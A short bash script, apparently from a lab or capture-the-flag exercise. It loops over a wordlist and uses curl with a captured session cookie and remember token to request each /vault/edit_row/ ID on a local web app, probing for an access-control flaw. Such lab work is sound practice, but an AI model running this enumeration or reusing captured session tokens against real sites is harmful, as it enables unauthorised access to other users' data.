#!/bin/bash

while IFS= read -r u; do
    curl -i -s -k -X 'GET' \
    -H 'Host: 127.0.0.1:5555' -H 'sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"' -H 'HX-Request: true' -H 'HX-Current-URL: http://127.0.0.1:5555/vault' -H 'sec-ch-ua-mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36' -H 'sec-ch-ua-platform: "Linux"' -H 'Accept: */*' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Dest: empty' -H 'Referer: http://127.0.0.1:5555/vault' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: close' \
    -b 'remember_token=2|388e68d90eeb79d71fba82bde9c8d2fd7b3a7dd40be5750fdf229ad06757a25d1448f5618cad6dcccf8449a89af63b5f0627c86b266eca3264f9a72d660e237a; session=.eJztkcFqwzAQRH9F7NkUSWtpV_6K3ksIK2kVG9ymWM4p5N8r6E_00NMwzDwYmCdc2y591Q7LxxPMOQQ-tXe5KUzwvqt0Nfv9ZrYvc96NlDJCc65bN9-j8waX1_TP_QnuMo0zD-0rLOfx0OG2CgvY1oRsiIFDrl4CJeewtBTYJ_aKrpasEVsiZI6ELnobcHYzlorNJZRaZ2ZKOUVJWZKlqDizU--sZqLMXL21UshRaWpt01zmWIljRJEx__roevyu8fD6AUWyx0I.ZIE_LA.cygaQ0J5A9_s1A1_q5Nq30G6Ruo' \
    "http://127.0.0.1:5555/vault/edit_row/$u"
done < wordlist.txt
